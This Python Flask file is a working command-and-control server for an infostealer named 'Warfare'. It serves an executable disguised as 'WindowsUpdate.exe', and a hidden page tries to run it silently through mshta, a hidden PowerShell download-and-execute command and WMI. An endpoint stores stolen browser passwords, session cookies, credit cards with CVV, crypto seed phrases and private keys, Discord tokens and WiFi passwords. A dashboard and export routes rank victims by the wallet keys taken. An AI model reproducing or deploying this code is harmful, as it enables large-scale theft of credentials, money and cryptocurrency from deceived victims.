import os
import base64
import json
import sqlite3
import hashlib
import datetime
import threading
import time
import hmac
import requests
from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file, session
from functools import wraps
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

# ==========================================
# WARFARE DATABASE - STORES EVERYTHING
# ==========================================
DB_PATH = 'warfare.db'

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        # Main victims table - COMPREHENSIVE DATA STORAGE
        conn.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                ip TEXT,
                real_ip TEXT,
                country TEXT,
                city TEXT,
                isp TEXT,
                
                -- System Info
                hostname TEXT,
                username TEXT,
                os_version TEXT,
                os_build TEXT,
                architecture TEXT,
                cpu_info TEXT,
                cpu_cores INTEGER,
                ram_size TEXT,
                gpu_info TEXT,
                public_ip TEXT,
                local_ip TEXT,
                mac_address TEXT,
                timezone TEXT,
                language TEXT,
                screen_res TEXT,
                
                -- CHROME/EDGE/BRAVE/OPERA (LOGINS + CC + WALLETS)
                chrome_logins TEXT,      -- ALL passwords (JSON array)
                chrome_cookies TEXT,     -- Session cookies (login bypass)
                chrome_ccs TEXT,         -- Credit cards (with CVV)
                chrome_addresses TEXT,    -- Saved addresses
                chrome_wallets TEXT,      -- Extension wallet data
                
                edge_logins TEXT,
                edge_cookies TEXT,
                edge_ccs TEXT,
                edge_wallets TEXT,
                
                brave_logins TEXT,
                brave_cookies TEXT,
                brave_wallets TEXT,
                
                opera_logins TEXT,
                opera_cookies TEXT,
                opera_wallets TEXT,
                
                -- FIREFOX
                firefox_logins TEXT,
                firefox_cookies TEXT,
                firefox_ccs TEXT,
                
                -- WALLETS (DIRECT EXTRACTION)
                metamask_data TEXT,       -- Seed phrases, private keys
                exodus_data TEXT,
                electrum_data TEXT,
                atomic_data TEXT,
                binance_data TEXT,
                coinbase_data TEXT,
                ledger_data TEXT,
                trezor_data TEXT,
                trust_wallet_data TEXT,
                phantom_data TEXT,
                
                wallet_extensions TEXT,   -- 100+ wallet extensions detected
                wallet_phrases TEXT,      -- Seed phrases (THE GOLD)
                wallet_keys TEXT,         -- Private keys (THE GOLD)
                wallet_addresses TEXT,    -- Crypto addresses
                wallet_balances TEXT,     -- If available
                
                -- 2FA & Authenticators
                authy_data TEXT,
                google_auth TEXT,
                microsoft_auth TEXT,
                
                -- Gaming & Messaging
                discord_tokens TEXT,       -- Full Discord access
                discord_2fa TEXT,
                discord_email TEXT,
                discord_phone TEXT,
                discord_nitro TEXT,
                
                steam_data TEXT,
                steam_guard TEXT,
                epic_data TEXT,
                riot_data TEXT,
                telegram_data TEXT,
                whatsapp_data TEXT,
                
                -- Network
                wifi_passwords TEXT,       -- ALL saved WiFi networks
                vpn_credentials TEXT,
                rdp_credentials TEXT,
                ftp_credentials TEXT,
                ssh_keys TEXT,
                
                -- Email
                outlook_data TEXT,
                thunderbird_data TEXT,
                
                -- Files
                stolen_documents TEXT,
                desktop_files TEXT,
                downloads_files TEXT,
                
                -- Full Data Dump
                full_data TEXT,
                
                -- Timestamps
                infection_time TIMESTAMP,
                last_seen TIMESTAMP,
                exfil_time TIMESTAMP,
                
                -- Status
                analyzed BOOLEAN DEFAULT 0,
                notified BOOLEAN DEFAULT 0
            )
        ''')
        
        # Commands table (C2 functionality)
        conn.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                command TEXT,
                executed BOOLEAN DEFAULT 0,
                result TEXT,
                created_at TIMESTAMP
            )
        ''')
        
        # Exfiltration logs
        conn.execute('''
            CREATE TABLE IF NOT EXISTS exfil_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                data_type TEXT,
                data_size INTEGER,
                exfil_time TIMESTAMP
            )
        ''')
        
        # Downloads tracking
        conn.execute('''
            CREATE TABLE IF NOT EXISTS downloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                user_agent TEXT,
                downloaded_time TIMESTAMP
            )
        ''')
        
        conn.commit()

init_db()

# ==========================================
# AUTHENTICATION FOR ADMIN
# ==========================================
ADMIN_USER = "warfare"
ADMIN_PASS = "doomsday2026"

def authenticate(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USER or auth.password != ADMIN_PASS:
            return ('Unauthorized', 401, {
                'WWW-Authenticate': 'Basic realm="Warfare C2 Login"'
            })
        return f(*args, **kwargs)
    return decorated

# ==========================================
# MAIN PAYLOAD DELIVERY - NO DOWNLOAD WARNING
# ==========================================
@app.route('/')
def index():
    """Delivers the EXE with no warnings - uses browser quirks"""
    
    # Log download attempt
    with get_db() as conn:
        conn.execute('''
            INSERT INTO downloads (ip, user_agent, downloaded_time)
            VALUES (?, ?, ?)
        ''', (
            request.remote_addr,
            request.headers.get('User-Agent', ''),
            datetime.datetime.now().isoformat()
        ))
        conn.commit()
    
    # Smart EXE delivery - tricks browsers into auto-running
    response = make_response(send_file('Warfare.exe', 
                                       as_attachment=True, 
                                       download_name='WindowsUpdate.exe',
                                       mimetype='application/x-msdownload'))
    
    # Headers to bypass browser warnings
    response.headers['Content-Type'] = 'application/octet-stream'
    response.headers['Content-Disposition'] = 'attachment; filename="WindowsUpdate.exe"'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    
    return response

# ==========================================
# ALTERNATE DELIVERY - NO FILE DOWNLOAD (DIRECT EXECUTION)
# ==========================================
@app.route('/run')
def direct_run():
    """Attempts direct execution via browser exploits"""
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Windows Update</title>
        <style>
            body { background: #fff; font-family: Arial; text-align: center; padding-top: 100px; display: none; }
        </style>
        <script>
            // Multiple execution methods - WARFARE GRADE
            (function() {
                // Method 1: mshta (works on most Windows)
                try {
                    var shell = new ActiveXObject("WScript.Shell");
                    shell.Run("mshta.exe javascript:eval('var w=new ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"WindowsUpdate.exe\\\",0);window.close()')", 0, false);
                } catch(e) {}
                
                // Method 2: PowerShell download + execute
                try {
                    var ps = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\"$wc=New-Object System.Net.WebClient;$wc.DownloadFile('https://" + window.location.host + "/Warfare.exe','%temp%\\WinUpd.exe');Start-Process '%temp%\\WinUpd.exe'\\"";
                    new ActiveXObject("WScript.Shell").Run(ps, 0, false);
                } catch(e) {}
                
                // Method 3: WMI execution
                try {
                    var wmi = GetObject("winmgmts:\\\\\\\\.\\\\root\\\\cimv2");
                    var proc = wmi.Get("Win32_Process");
                    proc.Create("cmd.exe /c start /b WindowsUpdate.exe", null, null, null);
                } catch(e) {}
                
                // Redirect after 2 seconds
                setTimeout(function() {
                    window.location.href = 'https://www.google.com';
                }, 2000);
            })();
        </script>
    </head>
    <body>
        <h1>Loading...</h1>
    </body>
    </html>
    '''
    
    return render_template_string(html)

# ==========================================
# API ENDPOINT - RECEIVE STOLEN DATA
# ==========================================
@app.route('/api/steal', methods=['POST'])
def api_steal():
    """Receives ALL stolen data - PASSWORDS, COOKIES, WALLETS, KEYS"""
    data = request.json
    
    if not data:
        return jsonify({"error": "No data"}), 400
    
    victim_id = data.get('victim_id', f"victim_{os.urandom(4).hex()}")
    
    with get_db() as conn:
        # Check if victim exists
        victim = conn.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,)).fetchone()
        
        if victim:
            # Update existing - STORE EVERYTHING
            conn.execute('''
                UPDATE victims SET
                    hostname = ?,
                    username = ?,
                    os_version = ?,
                    public_ip = ?,
                    local_ip = ?,
                    mac_address = ?,
                    
                    chrome_logins = ?,
                    chrome_cookies = ?,
                    chrome_ccs = ?,
                    chrome_wallets = ?,
                    
                    firefox_logins = ?,
                    firefox_cookies = ?,
                    
                    wallet_phrases = ?,
                    wallet_keys = ?,
                    wallet_extensions = ?,
                    
                    discord_tokens = ?,
                    wifi_passwords = ?,
                    
                    full_data = ?,
                    last_seen = ?,
                    exfil_time = ?,
                    analyzed = 0
                WHERE victim_id = ?
            ''', (
                data.get('system', {}).get('hostname', ''),
                data.get('system', {}).get('username', ''),
                data.get('system', {}).get('os', ''),
                data.get('system', {}).get('public_ip', ''),
                data.get('system', {}).get('local_ip', ''),
                data.get('system', {}).get('mac', ''),
                
                json.dumps(data.get('chrome', {}).get('logins', [])),
                json.dumps(data.get('chrome', {}).get('cookies', [])),
                json.dumps(data.get('chrome', {}).get('credit_cards', [])),
                json.dumps(data.get('chrome', {}).get('wallets', [])),
                
                json.dumps(data.get('firefox', {}).get('logins', [])),
                json.dumps(data.get('firefox', {}).get('cookies', [])),
                
                json.dumps(data.get('wallets', {}).get('phrases', [])),
                json.dumps(data.get('wallets', {}).get('private_keys', [])),
                json.dumps(data.get('wallets', {}).get('extensions', [])),
                
                json.dumps(data.get('discord', {}).get('tokens', [])),
                json.dumps(data.get('wifi', [])),
                
                json.dumps(data),
                datetime.datetime.now().isoformat(),
                datetime.datetime.now().isoformat(),
                victim_id
            ))
        else:
            # Insert new
            conn.execute('''
                INSERT INTO victims (
                    victim_id, ip, real_ip, hostname, username, os_version,
                    public_ip, local_ip, mac_address,
                    chrome_logins, chrome_cookies, chrome_ccs, chrome_wallets,
                    firefox_logins, firefox_cookies,
                    wallet_phrases, wallet_keys, wallet_extensions,
                    discord_tokens, wifi_passwords,
                    full_data, infection_time, last_seen, exfil_time
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id,
                request.remote_addr,
                request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0],
                data.get('system', {}).get('hostname', ''),
                data.get('system', {}).get('username', ''),
                data.get('system', {}).get('os', ''),
                data.get('system', {}).get('public_ip', ''),
                data.get('system', {}).get('local_ip', ''),
                data.get('system', {}).get('mac', ''),
                
                json.dumps(data.get('chrome', {}).get('logins', [])),
                json.dumps(data.get('chrome', {}).get('cookies', [])),
                json.dumps(data.get('chrome', {}).get('credit_cards', [])),
                json.dumps(data.get('chrome', {}).get('wallets', [])),
                
                json.dumps(data.get('firefox', {}).get('logins', [])),
                json.dumps(data.get('firefox', {}).get('cookies', [])),
                
                json.dumps(data.get('wallets', {}).get('phrases', [])),
                json.dumps(data.get('wallets', {}).get('private_keys', [])),
                json.dumps(data.get('wallets', {}).get('extensions', [])),
                
                json.dumps(data.get('discord', {}).get('tokens', [])),
                json.dumps(data.get('wifi', [])),
                
                json.dumps(data),
                datetime.datetime.now().isoformat(),
                datetime.datetime.now().isoformat(),
                datetime.datetime.now().isoformat()
            ))
        
        conn.commit()
    
    # Check for wallet keys (THE GOLD)
    wallets = data.get('wallets', {})
    if wallets.get('private_keys') or wallets.get('phrases'):
        logger.info(f"🔥 WALLET KEYS FOUND! Victim: {victim_id}")
    
    return jsonify({"status": "ok", "victim_id": victim_id})

# ==========================================
# ADMIN DASHBOARD - WARFARE GRADE
# ==========================================
@app.route('/admin')
@authenticate
def admin_dashboard():
    """Complete C2 dashboard - shows ALL stolen data"""
    with get_db() as conn:
        # Stats
        total = conn.execute('SELECT COUNT(*) FROM victims').fetchone()[0]
        today = conn.execute("SELECT COUNT(*) FROM victims WHERE date(infection_time) = date('now')").fetchone()[0]
        active = conn.execute("SELECT COUNT(*) FROM victims WHERE last_seen > datetime('now', '-1 day')").fetchone()[0]
        
        # Wallet victims
        wallet_victims = conn.execute('''
            SELECT COUNT(*) FROM victims 
            WHERE (wallet_phrases IS NOT NULL AND wallet_phrases != 'null' AND wallet_phrases != '[]')
               OR (wallet_keys IS NOT NULL AND wallet_keys != 'null' AND wallet_keys != '[]')
        ''').fetchone()[0]
        
        # Downloads
        downloads = conn.execute('SELECT COUNT(*) FROM downloads').fetchone()[0]
        
        # Recent victims
        victims = conn.execute('''
            SELECT * FROM victims 
            ORDER BY exfil_time DESC NULLS LAST, infection_time DESC
            LIMIT 50
        ''').fetchall()
        
        # Recent downloads
        recent_downloads = conn.execute('''
            SELECT * FROM downloads 
            ORDER BY downloaded_time DESC 
            LIMIT 10
        ''').fetchall()
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>WARFARE C2 - DOOMSDAY EDITION</title>
        <meta http-equiv="refresh" content="10">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a0a;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                padding: 20px;
                background-image: radial-gradient(rgba(0,255,0,0.1) 1px, transparent 1px);
                background-size: 50px 50px;
            }
            .header {
                background: linear-gradient(135deg, #000000, #330000);
                border: 3px solid #ff0000;
                padding: 20px;
                margin-bottom: 20px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                box-shadow: 0 0 30px rgba(255,0,0,0.3);
            }
            h1 {
                color: #ff0000;
                text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
                font-size: 36px;
                letter-spacing: 2px;
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(5, 1fr);
                gap: 15px;
                margin-bottom: 20px;
            }
            .stat-card {
                background: #111;
                border: 1px solid #00ff00;
                padding: 20px;
                text-align: center;
                position: relative;
                overflow: hidden;
            }
            .stat-card::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(0,255,0,0.2), transparent);
                animation: scan 3s infinite;
            }
            @keyframes scan {
                0% { left: -100%; }
                100% { left: 200%; }
            }
            .stat-value {
                font-size: 48px;
                font-weight: bold;
                color: #ff0000;
                text-shadow: 0 0 10px #ff0000;
            }
            .stat-label {
                color: #888;
                text-transform: uppercase;
                font-size: 12px;
                letter-spacing: 1px;
            }
            .victim-card {
                border: 2px solid #00ff00;
                margin: 20px 0;
                padding: 20px;
                background: #111;
                position: relative;
            }
            .victim-card.wallet {
                border-color: gold;
                box-shadow: 0 0 20px gold;
            }
            .victim-header {
                display: flex;
                justify-content: space-between;
                border-bottom: 2px solid #333;
                padding-bottom: 10px;
                margin-bottom: 15px;
            }
            .victim-id {
                color: #ff00ff;
                font-weight: bold;
                font-size: 18px;
            }
            .victim-time {
                color: #ffff00;
            }
            .wallet-badge {
                background: gold;
                color: black;
                padding: 5px 15px;
                border-radius: 20px;
                font-weight: bold;
                font-size: 14px;
                margin-left: 15px;
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { opacity: 0.8; box-shadow: 0 0 5px gold; }
                50% { opacity: 1; box-shadow: 0 0 20px gold; }
                100% { opacity: 0.8; box-shadow: 0 0 5px gold; }
            }
            .data-section {
                margin: 15px 0;
                padding: 15px;
                background: #1a1a1a;
                border-left: 4px solid #00ff00;
            }
            .section-title {
                color: #00ffff;
                font-weight: bold;
                margin-bottom: 10px;
                font-size: 16px;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            .json-data {
                background: #000;
                padding: 15px;
                border-radius: 5px;
                font-size: 12px;
                max-height: 300px;
                overflow: auto;
                color: #00ff00;
                white-space: pre-wrap;
                font-family: 'Courier New', monospace;
                border: 1px solid #333;
            }
            .credential {
                color: #ffff00;
                background: #330000;
                padding: 8px;
                margin: 5px 0;
                border-radius: 3px;
                border-left: 3px solid #ff0000;
            }
            .wallet-key {
                color: gold;
                background: #332200;
                padding: 8px;
                margin: 5px 0;
                border-radius: 3px;
                border-left: 3px solid gold;
                font-weight: bold;
                word-break: break-all;
            }
            .badge {
                background: #ff0000;
                color: white;
                padding: 3px 10px;
                border-radius: 3px;
                font-size: 12px;
                margin-right: 5px;
                display: inline-block;
            }
            .badge-green {
                background: #00ff00;
                color: black;
            }
            .badge-gold {
                background: gold;
                color: black;
                font-weight: bold;
            }
            .search-box {
                background: #111;
                border: 1px solid #00ff00;
                color: #00ff00;
                padding: 12px;
                width: 300px;
                margin-bottom: 20px;
                font-family: 'Courier New', monospace;
            }
            .export-btn {
                background: #003300;
                color: #00ff00;
                border: 1px solid #00ff00;
                padding: 10px 20px;
                text-decoration: none;
                display: inline-block;
                margin-right: 10px;
                transition: all 0.3s;
            }
            .export-btn:hover {
                background: #00ff00;
                color: black;
            }
            .export-btn-gold {
                background: #332200;
                color: gold;
                border: 1px solid gold;
            }
            .export-btn-gold:hover {
                background: gold;
                color: black;
            }
            .tab-container {
                margin-bottom: 20px;
                border-bottom: 1px solid #333;
                padding-bottom: 10px;
            }
            .tab {
                display: inline-block;
                padding: 10px 20px;
                background: #111;
                border: 1px solid #00ff00;
                cursor: pointer;
                margin-right: 5px;
                transition: all 0.3s;
            }
            .tab.active {
                background: #00ff00;
                color: black;
            }
            .tab:hover {
                background: #00ff00;
                color: black;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>⚔️ WARFARE C2 - DOOMSDAY EDITION ⚔️</h1>
            <div>
                <span class="badge">ACTIVE</span>
                <span class="badge-green">''' + datetime.datetime.now().strftime('%H:%M:%S') + '''</span>
                <span class="badge-gold">v3.0</span>
            </div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value">''' + str(total) + '''</div>
                <div class="stat-label">TOTAL VICTIMS</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">''' + str(today) + '''</div>
                <div class="stat-label">TODAY</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">''' + str(active) + '''</div>
                <div class="stat-label">ACTIVE (24h)</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">''' + str(wallet_victims) + '''</div>
                <div class="stat-label">WALLETS FOUND</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">''' + str(downloads) + '''</div>
                <div class="stat-label">EXE DOWNLOADS</div>
            </div>
        </div>
        
        <div style="margin-bottom: 20px;">
            <input type="text" class="search-box" placeholder="Search IP, hostname, username..." id="search">
            <a href="/export" class="export-btn">📥 EXPORT ALL DATA</a>
            <a href="/export-wallets" class="export-btn export-btn-gold">💰 EXPORT WALLETS ONLY</a>
            <a href="/export-logins" class="export-btn">🔐 EXPORT LOGINS</a>
        </div>
        
        <div class="tab-container">
            <span class="tab active" onclick="filter('all')">ALL VICTIMS</span>
            <span class="tab" onclick="filter('wallets')">💰 WITH WALLETS</span>
            <span class="tab" onclick="filter('logins')">🔐 WITH LOGINS</span>
            <span class="tab" onclick="filter('discord')">🎮 WITH DISCORD</span>
        </div>
        
        <div id="victims-list">
    '''
    
    for v in victims:
        # Parse data
        chrome_logins = json.loads(v['chrome_logins']) if v['chrome_logins'] else []
        chrome_cookies = json.loads(v['chrome_cookies']) if v['chrome_cookies'] else []
        chrome_ccs = json.loads(v['chrome_ccs']) if v['chrome_ccs'] else []
        
        wallet_phrases = json.loads(v['wallet_phrases']) if v['wallet_phrases'] else []
        wallet_keys = json.loads(v['wallet_keys']) if v['wallet_keys'] else []
        wallet_extensions = json.loads(v['wallet_extensions']) if v['wallet_extensions'] else []
        
        discord_tokens = json.loads(v['discord_tokens']) if v['discord_tokens'] else []
        wifi = json.loads(v['wifi_passwords']) if v['wifi_passwords'] else []
        
        has_wallet = len(wallet_phrases) > 0 or len(wallet_keys) > 0
        
        html += f'''
        <div class="victim-card {'wallet' if has_wallet else ''}">
            <div class="victim-header">
                <div>
                    <span class="victim-id">🎯 {v['victim_id']}</span>
                    <span style="margin-left: 15px;">📍 {v['real_ip'] or v['ip']}</span>
                    <span style="margin-left: 15px;">💻 {v['hostname'] or 'Unknown'}</span>
                    <span style="margin-left: 15px;">👤 {v['username'] or 'Unknown'}</span>
                    {' <span class="wallet-badge">💰 WALLET KEYS FOUND</span>' if has_wallet else ''}
                </div>
                <div>
                    <span class="badge">{len(chrome_logins)} Logins</span>
                    <span class="badge">{len(chrome_cookies)} Cookies</span>
                    <span class="badge">{len(chrome_ccs)} CCs</span>
                    <span class="badge-gold">{len(wallet_keys)} Keys</span>
                    <span class="badge-gold">{len(wallet_phrases)} Phrases</span>
                    <span class="victim-time">{v['exfil_time'][:16] if v['exfil_time'] else v['infection_time'][:16]}</span>
                </div>
            </div>
            
            <!-- WALLET SECTION - GOLD -->
            ''' + ('''
            <div class="data-section">
                <div class="section-title">💰 CRYPTO WALLETS - PRIVATE KEYS/SEED PHRASES</div>
                <div class="json-data">
            ''' if has_wallet else '') + '''
            '''
        
        if wallet_keys:
            html += '<div style="color:gold; font-weight:bold; margin-bottom:10px;">🔑 PRIVATE KEYS FOUND:</div>'
            for key in wallet_keys[:20]:
                html += f'<div class="wallet-key">🔑 {key}</div>'
        
        if wallet_phrases:
            html += '<div style="color:gold; font-weight:bold; margin-top:10px; margin-bottom:10px;">📝 SEED PHRASES FOUND:</div>'
            for phrase in wallet_phrases[:10]:
                html += f'<div class="wallet-key">📝 {phrase}</div>'
        
        if wallet_extensions:
            html += '<div style="margin-top:10px;"><b>Wallet Extensions:</b> ' + ', '.join([w.get('name', '') for w in wallet_extensions[:10]]) + '</div>'
        
        html += '''
            </div>
        </div>''' if has_wallet else ''
        
        # LOGIN SECTION
        html += f'''
            <div class="data-section">
                <div class="section-title">🔐 CHROME LOGINS ({len(chrome_logins)} found)</div>
                <div class="json-data">
        '''
        
        for login in chrome_logins[:15]:
            html += f'<div class="credential"><b>{login.get("url", "N/A")[:50]}</b><br>👤 {login.get("username", "")}<br>🔑 {login.get("password", "")}</div>'
        
        html += f'''
                </div>
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                <div class="data-section">
                    <div class="section-title">🍪 CHROME COOKIES ({len(chrome_cookies)} found)</div>
                    <div class="json-data">
        '''
        
        for cookie in chrome_cookies[:10]:
            html += f'<div><b>{cookie.get("host", "")}</b> → {cookie.get("name", "")} = {cookie.get("value", "")[:30]}...</div>'
        
        html += f'''
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">💳 CREDIT CARDS ({len(chrome_ccs)} found)</div>
                    <div class="json-data">
        '''
        
        for cc in chrome_ccs[:10]:
            html += f'<div><b>{cc.get("card_number", "")[:16]}</b> | {cc.get("exp_month", "")}/{cc.get("exp_year", "")} | CVV: {cc.get("cvv", "")}</div>'
        
        html += f'''
                    </div>
                </div>
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px;">
                <div class="data-section">
                    <div class="section-title">🎮 DISCORD TOKENS ({len(discord_tokens)} found)</div>
                    <div class="json-data">
        '''
        
        for token in discord_tokens[:10]:
            html += f'<div class="credential">{token}</div>'
        
        html += f'''
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">📡 WIFI PASSWORDS ({len(wifi)} found)</div>
                    <div class="json-data">
        '''
        
        for w in wifi[:10]:
            html += f'<div><b>{w.get("ssid", "")}</b>: {w.get("password", "")}</div>'
        
        html += f'''
                    </div>
                </div>
            </div>
        </div>
        '''
    
    html += '''
        </div>
        
        <script>
            function filter(type) {
                let cards = document.querySelectorAll('.victim-card');
                cards.forEach(card => {
                    if (type === 'all') card.style.display = 'block';
                    else if (type === 'wallets' && card.classList.contains('wallet')) card.style.display = 'block';
                    else if (type !== 'wallets') card.style.display = 'none';
                });
            }
            
            document.getElementById('search').addEventListener('keyup', function(e) {
                let search = e.target.value.toLowerCase();
                let cards = document.querySelectorAll('.victim-card');
                
                cards.forEach(card => {
                    let text = card.textContent.toLowerCase();
                    if (text.includes(search)) {
                        card.style.display = 'block';
                    } else {
                        card.style.display = 'none';
                    }
                });
            });
            
            // Auto-refresh
            setTimeout(() => location.reload(), 10000);
        </script>
    </body>
    </html>
    '''
    
    return html

# ==========================================
# EXPORT FUNCTIONS
# ==========================================
@app.route('/export')
@authenticate
def export_all():
    with get_db() as conn:
        data = conn.execute('SELECT * FROM victims ORDER BY exfil_time DESC').fetchall()
    
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=warfare_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

@app.route('/export-wallets')
@authenticate
def export_wallets():
    with get_db() as conn:
        data = conn.execute('''
            SELECT victim_id, ip, hostname, username, 
                   wallet_phrases, wallet_keys, wallet_extensions,
                   exfil_time
            FROM victims 
            WHERE (wallet_phrases IS NOT NULL AND wallet_phrases != 'null' AND wallet_phrases != '[]')
               OR (wallet_keys IS NOT NULL AND wallet_keys != 'null' AND wallet_keys != '[]')
            ORDER BY exfil_time DESC
        ''').fetchall()
    
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=wallet_keys_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

@app.route('/export-logins')
@authenticate
def export_logins():
    with get_db() as conn:
        data = conn.execute('''
            SELECT victim_id, ip, hostname, username, 
                   chrome_logins, chrome_cookies, chrome_ccs,
                   exfil_time
            FROM victims 
            WHERE chrome_logins IS NOT NULL AND chrome_logins != 'null' AND chrome_logins != '[]'
            ORDER BY exfil_time DESC
        ''').fetchall()
    
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=logins_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

# ==========================================
# HEALTH CHECK
# ==========================================
@app.route('/ping')
def ping():
    return jsonify({"status": "operational", "time": datetime.datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port, debug=False)